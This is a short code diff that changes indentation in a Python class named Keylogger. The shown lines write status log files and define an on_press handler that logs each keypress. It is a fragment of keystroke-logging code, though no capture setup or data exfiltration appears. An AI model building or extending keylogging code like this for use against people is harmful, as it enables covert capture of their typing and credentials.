@@ -94,9 +94,9 @@ class Keylogger():
             file_creator.create_file("logs", keylogger.script_name,"Script completed successfully")
         else:
             file_creator.create_file("logs",keylogger.script_name,"Script may have encountered erros")
-
+	
 	def on_press(key):
-    		logging.info(str(key))
+            logging.info(str(key))
 
 
         
